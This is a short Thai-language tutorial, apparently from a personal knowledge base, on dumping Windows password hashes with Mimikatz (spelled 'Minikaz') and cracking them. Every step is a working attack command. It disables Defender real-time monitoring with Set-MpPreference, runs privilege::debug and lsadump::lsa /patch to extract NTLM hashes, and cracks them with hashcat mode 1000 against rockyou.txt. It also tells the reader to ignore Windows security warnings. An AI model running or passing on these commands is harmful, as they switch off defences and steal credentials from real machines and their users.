# How to dump password on WindowsOS via Minikaz

Step 1: อันดับแรกจะต้องทำการปิด Antivirus บน Windows ก่อน โดยเราสามารถเข้าไปยัง Powershell ด้วยสิทธิ **Admin** แล้วพิมพ์คำสั่งดังนี้

```sh
# Disable Realtime Protection 
Set-MpPreference -DisableRealtimeMonitoring $true
```
Step 2: จากนั้นเข้าไป Download ไฟล์ Minikatz.exe ได้ตาม 
[Link Download Minikaz](https://github.com/ParrotSec/mimikatz/tree/master/x64) ได้เลย

Step 3: Run Minikatz ด้วยสิทธิ Admin (ไม่ต้องตกใจหากมีการเตือนจาก Windows)
![](/KB/img/minikaz1.png)

Step 4: รันคำสั่ง

```sh
# ตรวจสอบว่าได้ผลลัพธ์เป็น "Privilege '20' ok" หรือไม่ หากไม่ได้ให้รันด้วยสิทธิ Admin
privilege::debug

# Dump hashes
lsadump::lsa /patch
```

Step 5: Download Hashcat [Link Download Hashcat](https://hashcat.net/hashcat/) 

```sh
# ตรวจสอบ Hashcat 
hashcat --help 
# เลือกใช้ Mode 1000 ซึ่งเป็นการ Crack NTLM Hash 
hashcat -m 1000 <hash> rockyou.txt --show

# Example
#hashcat -m 1000 7ce21f17c0aee7fb9ceba532d0546ad6 rockyou.txt --show
```

![](/KB/img/minikaz2.png)

Step 6: ถ้า Crack สำเร็จเราจะได้รหัสผ่านกลับมาตามภาพ 

![](/KB/img/minikaz3.png)


**Powered By** : 
Icesuntisuk 
๙ เม.ย.๖๗